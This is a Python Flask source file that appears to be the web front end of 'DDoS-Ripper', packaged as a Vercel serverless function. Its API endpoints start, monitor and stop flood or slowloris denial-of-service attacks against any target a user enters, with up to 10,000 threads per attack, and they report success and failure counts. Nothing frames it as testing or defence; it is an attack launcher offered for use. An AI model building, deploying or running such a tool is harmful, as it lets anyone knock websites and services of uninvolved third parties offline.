#!/usr/bin/env python3
"""
Vercel Serverless Function Entry Point
Flask Web Application for DDoS-Ripper
"""

from flask import Flask, render_template, request, jsonify
import threading
import time
import sys
import os

# Add parent directory to path to import DRipper
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from DRipper import DRipper

app = Flask(__name__, 
            template_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates'),
            static_folder=os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static'))

# Global attack instance (in-memory store)
# Note: In serverless, this will be per-instance, but works for short-lived attacks
attacks_store = {}
attacks_lock = threading.Lock()


def run_attack(attack_id, target, threads, mode):
    """Run attack in a separate thread"""
    try:
        attack = DRipper(target=target, threads=threads)
        attack.start_time = time.time()
        attack.attack_id = attack_id
        
        with attacks_lock:
            attacks_store[attack_id] = attack
        
        # Run attack - create worker threads
        attack_func = attack.slowloris_attack if mode == 'slowloris' else attack.attack
        
        threads_list = []
        for i in range(threads):
            thread = threading.Thread(target=attack_func, daemon=True)
            thread.start()
            threads_list.append(thread)
        
        # Keep running
        while attack.running:
            time.sleep(0.1)
            
    except Exception as e:
        print(f"Error in attack {attack_id}: {e}")
        with attacks_lock:
            if attack_id in attacks_store:
                attacks_store[attack_id].running = False


@app.route('/')
def index():
    """Main page"""
    return render_template('index.html')


@app.route('/api/start', methods=['POST'])
def start_attack():
    """Start attack"""
    import uuid
    
    data = request.json
    target = data.get('target', '').strip()
    threads = int(data.get('threads', 135))
    mode = data.get('mode', 'flood')
    
    if not target:
        return jsonify({'error': 'Target is required'}), 400
    
    if threads < 1 or threads > 10000:
        return jsonify({'error': 'Threads must be between 1 and 10000'}), 400
    
    # Generate unique attack ID
    attack_id = str(uuid.uuid4())
    
    # Start attack in separate thread
    attack_thread = threading.Thread(
        target=run_attack,
        args=(attack_id, target, threads, mode),
        daemon=True
    )
    attack_thread.start()
    
    # Give it a moment to start
    time.sleep(0.5)
    
    return jsonify({
        'success': True, 
        'message': 'Attack started',
        'attack_id': attack_id
    })


@app.route('/api/stop', methods=['POST'])
def stop_attack():
    """Stop attack"""
    data = request.json
    attack_id = data.get('attack_id')
    
    if not attack_id:
        return jsonify({'error': 'Attack ID is required'}), 400
    
    with attacks_lock:
        if attack_id in attacks_store:
            attack = attacks_store[attack_id]
            attack.running = False
            time.sleep(1)
            
            # Get final stats
            final_stats = {
                'total': attack.stats['total'],
                'success': attack.stats['success'],
                'failed': attack.stats['failed'],
                'errors': dict(attack.stats['errors']),
                'duration': time.time() - attack.start_time if hasattr(attack, 'start_time') else 0
            }
            
            # Remove from store
            del attacks_store[attack_id]
            
            return jsonify({'success': True, 'stats': final_stats})
    
    return jsonify({'error': 'Attack not found'}), 404


@app.route('/api/status', methods=['GET'])
def get_status():
    """Get current attack status"""
    attack_id = request.args.get('attack_id')
    
    if not attack_id:
        return jsonify({'running': False, 'error': 'Attack ID required'})
    
    with attacks_lock:
        if attack_id in attacks_store:
            attack = attacks_store[attack_id]
            if attack.running:
                with attack.lock:
                    stats = {
                        'running': True,
                        'total': attack.stats['total'],
                        'success': attack.stats['success'],
                        'failed': attack.stats['failed'],
                        'errors': dict(attack.stats['errors']),
                        'duration': time.time() - attack.start_time if hasattr(attack, 'start_time') else 0,
                        'target': attack.target,
                        'threads': attack.threads
                    }
                return jsonify(stats)
            else:
                # Attack stopped, return final stats
                stats = {
                    'running': False,
                    'total': attack.stats['total'],
                    'success': attack.stats['success'],
                    'failed': attack.stats['failed'],
                    'errors': dict(attack.stats['errors']),
                    'duration': time.time() - attack.start_time if hasattr(attack, 'start_time') else 0
                }
                del attacks_store[attack_id]
                return jsonify(stats)
    
    return jsonify({'running': False})


# Vercel serverless function handler
# Export the Flask app as 'handler' for Vercel
# Vercel will automatically use this as the WSGI application
handler = app

# For local development
if __name__ == '__main__':
    print("\n" + "=" * 70)
    print("🌐 DDoS-Ripper Web Interface (Vercel Compatible)")
    print("=" * 70)
    print("Starting web server...")
    print("Open your browser and navigate to: http://localhost:5000")
    print("Press Ctrl+C to stop the server")
    print("=" * 70 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)

